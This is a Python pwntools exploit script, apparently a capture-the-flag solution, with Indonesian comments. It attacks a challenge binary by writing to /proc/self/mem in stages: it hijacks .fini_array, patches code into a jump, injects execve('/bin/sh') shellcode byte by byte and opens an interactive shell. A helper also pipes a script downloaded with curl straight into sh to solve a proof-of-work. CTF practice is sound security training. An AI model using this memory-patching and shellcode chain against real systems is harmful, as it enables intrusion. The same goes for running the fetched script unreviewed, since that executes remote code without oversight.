#!/usr/bin/env python3
from pwn import *
exe = context.binary = ELF(args.EXE or './chall_patched')
context.terminal = ['wt.exe','wsl.exe']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

HOST = 'ctf.csd.lol'
PORT = 8888

def solve_pow(challenge):
    """
    Jalankan PoW helper dari pwn.red
    """
    cmd = f"curl -sSfL https://pwn.red/pow | sh -s {challenge}"
    log.info("Solving PoW...")
    out = subprocess.check_output(cmd, shell=True)
    return out.strip()

p = start()

# === ADDRESSES ===
ADDR_FINI_ARRAY = 0x403df0
ADDR_MAIN_LSB   = 0xb5      
ADDR_PUTS_CALL  = 0x4013d9  # Byte LSB displacement 'call puts'
ADDR_XOR_EAX    = 0x4012ce  # Lokasi 'xor eax, eax' (31 c0)
ADDR_SHELLCODE  = 0x4012d2  # Code cave

log.info("=== STAGE 1: Gain Extra Life (.fini_array -> main) ===")
# Loop 1: Dapatkan 1 nyawa tambahan
p.sendlineafter(b"filename: ", b"/proc/self/mem")
p.sendlineafter(b"offset: ", str(ADDR_FINI_ARRAY).encode())
p.sendafter(b"data: ", p8(ADDR_MAIN_LSB)) 

log.info("=== STAGE 2: Enable Infinite Loop (call puts -> call _start) ===")
# Loop 2: Hijack exit path menjadi restart path
p.sendlineafter(b"filename: ", b"/proc/self/mem")
p.sendlineafter(b"offset: ", str(ADDR_PUTS_CALL).encode())
p.sendafter(b"data: ", b"\xD3") # 0x13 -> 0xD3

# Mulai sini, program akan silent loop (karena puts dibajak).
# Kita TIDAK melakukan stack alignment patch. Langsung ke code patch.

log.info("=== STAGE 3: Safe Patching Part 1 (XOR Operand) ===")
# Ubah '31 C0' (xor eax, eax) -> '31 56' (xor [rsi+0x56], edx)
# RSI adalah argv (stack pointer), jadi operasi ini aman menulis ke stack.
p.sendlineafter(b"filename: ", b"/proc/self/mem")
p.sendlineafter(b"offset: ", str(ADDR_XOR_EAX + 1).encode())
p.sendafter(b"data: ", b"\x56")

log.info("=== STAGE 4: Activate Jump (XOR Opcode -> JMP) ===")
# Ubah '31 56' -> 'EB 56' (JMP +0x56)
# Patch aktif! Input filename/offset akan dilompati.
p.sendlineafter(b"filename: ", b"/proc/self/mem")
p.sendlineafter(b"offset: ", str(ADDR_XOR_EAX).encode())
p.sendafter(b"data: ", b"\xeb")

log.success("PATCH ACTIVE! Input logic bypassed.")

log.info("=== STAGE 5: Inject Shellcode ===")
# Shellcode: execve("/bin/sh", 0, 0)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05"

for i, byte in enumerate(shellcode):
    target_addr = ADDR_SHELLCODE + i
    # JMP sudah aktif, langsung kirim offset
    p.sendlineafter(b"offset: ", str(target_addr).encode())
    p.sendafter(b"data: ", p8(byte))
    if i % 5 == 0: print(f"Injecting {i}/{len(shellcode)}...")

log.info("=== STAGE 6: Trigger Shell ===")
# Ubah JMP offset jadi 0x02 untuk slide ke shellcode (di 0x4012d2)
# Jarak 0x4012ce -> 0x4012d2 adalah 4 byte. Instruksi JMP 2 byte. Sisa 2 byte.
p.sendlineafter(b"offset: ", str(ADDR_XOR_EAX + 1).encode())
p.sendafter(b"data: ", b"\x02")

p.clean()
p.interactive()

